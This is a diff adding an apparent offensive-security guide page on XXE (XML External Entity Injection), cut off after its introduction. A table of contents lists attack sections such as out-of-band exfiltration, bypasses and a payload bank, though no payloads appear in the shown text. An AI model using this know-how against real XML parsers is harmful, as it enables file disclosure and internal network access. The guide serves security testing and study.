@@ -1,0 +1,3201 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+        <meta name="author" content="yunni">
+      
+      
+        <link rel="canonical" href="https://yunniperka.github.io/RedHub/Web/XXE/">
+      
+      
+        <link rel="prev" href="../Command_Injection/">
+      
+      
+        <link rel="next" href="../Cypher_Injection/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>XXE (XML External Entity Injection) - RedHub</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CFira+Code:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"Fira Code"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/custom.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#xml-external-entity-injection-xxe" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="RedHub" class="md-header__button md-logo" aria-label="RedHub" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            RedHub
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              XXE (XML External Entity Injection)
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="RedHub" class="md-nav__button md-logo" aria-label="RedHub" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    RedHub
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Windows
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../dupa.md" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Dupa
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Linux
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../dupa.md" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Dupa
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Enterprise Environments
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Enterprise Environments
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AD/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Security
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Web Security
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Initial_Reconnaissance/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Initial Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL_Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SSTI/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSTI (Server Side Template Injection)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Command_Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Command Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XXE (XML External Entity Injection)
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XXE (XML External Entity Injection)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Introduction
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#useful-resources" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Useful Resources
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#basics" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Basics
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xml-quick-refresher" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        XML Quick Refresher
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#main-xxe-types" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Main XXE Types
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#where-to-test" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Where to Test
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#safe-testing-workflow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Safe Testing Workflow
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#first-probe-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        First Probe Payloads
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="First Probe Payloads">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#internal-entity-test" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Internal Entity Test
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#basic-external-entity-callback" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Basic External Entity Callback
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#basic-file-read" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Basic File Read
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#in-band-xxe" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        In-Band XXE
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blind-xxe" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind XXE
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#out-of-band-xxe-with-external-dtd" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Out-of-Band XXE with External DTD
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#oob-data-exfiltration-pattern" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        OOB Data Exfiltration Pattern
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#error-based-xxe" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Error-Based XXE
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xxe-as-ssrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        XXE as SSRF
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xinclude-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        XInclude Injection
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xxe-via-svg-upload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        XXE via SVG Upload
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xxe-via-office-documents" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        XXE via Office Documents
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xxe-via-soap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        XXE via SOAP
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xxe-via-saml" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        XXE via SAML
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xxe-via-rss-atom-feeds" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        XXE via RSS / Atom Feeds
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xxe-via-content-type-switching" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        XXE via Content-Type Switching
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#common-file-targets" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Common File Targets
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#php-wrapper-tricks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PHP Wrapper Tricks
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#java-specific-notes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Java-Specific Notes
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#entity-expansion-dos" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Entity Expansion DoS
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#common-bypasses" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Common Bypasses
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Common Bypasses">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#parameter-entities" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Parameter Entities
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#external-dtd" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        External DTD
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#encoding" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Encoding
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#alternative-protocols" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Alternative Protocols
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#content-type-switching" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Content-Type Switching
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xml-case-whitespace-variations" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        XML Case / Whitespace Variations
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cdata-confusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CDATA Confusion
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#response-analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Response Analysis
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blind-xxe-oast-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind XXE OAST Checklist
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#common-false-positives" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Common False Positives
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#impact-chaining" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Impact Chaining
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#manual-xxe-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Manual XXE Checklist
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Manual XXE Checklist">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Discovery
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#basic-testing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Basic Testing
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#in-band-xxe_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        In-Band XXE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blind-oob-xxe" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind / OOB XXE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ssrf-via-xxe" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SSRF via XXE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#file-uploads" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        File Uploads
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bypass-testing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Bypass Testing
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#impact" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Impact
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#remediation-review" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Remediation Review
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#quick-payload-bank" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Quick Payload Bank
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#practical-summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Practical Summary
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Cypher_Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cypher Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XSS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XSS (Cross-Site Scripting)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF (Server-Side Request Forgery)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CSRF (Cross-Site Request Forgery)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Networking & Infrastructure
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Networking & Infrastructure
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Networking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Network Architecture
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Modern Architecture
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Modern Architecture
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Cloud/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cloud
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Containers/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Containers
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Virtualization/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Virtualization
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="xml-external-entity-injection-xxe">XML External Entity Injection — XXE</h1>
+<h2 id="introduction">Introduction</h2>
+<p>XML External Entity Injection, usually shortened to <strong>XXE</strong>, is a vulnerability where an XML parser processes attacker-controlled external entities in an unsafe way.</p>
+<p>The key idea:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>User-controlled XML  →  XML parser resolves entity  →  local file / internal URL / external URL is accessed
+</span></code></pre></div>
+<p>This is dangerous because XML parsers may be able to read local files, make server-side HTTP requests, access internal services, or expand entities in a way that causes denial of service.</p>
+<p>XXE can lead to:</p>
+<ul>
+<li>local file disclosure</li>
